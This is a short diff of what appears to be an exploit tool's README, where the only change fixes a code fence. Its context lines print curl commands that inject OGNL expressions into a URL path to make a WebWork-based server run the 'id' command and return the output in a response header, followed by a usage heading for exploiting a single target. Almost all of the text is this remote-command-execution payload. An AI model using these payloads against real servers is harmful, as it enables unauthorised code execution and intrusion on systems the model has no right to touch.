@@ -17,7 +17,7 @@ curl -v http://target_IP:port/${Class.forName("com.opensymphony.webwork.ServletA
 or
 ```
 curl -v http://target_IP:port/${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec("id").getInputStream(),"utf-8")).(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader("X-Cmd-Response",#a))}
- 
+``` 
 - Usage
 
 Exploit single target
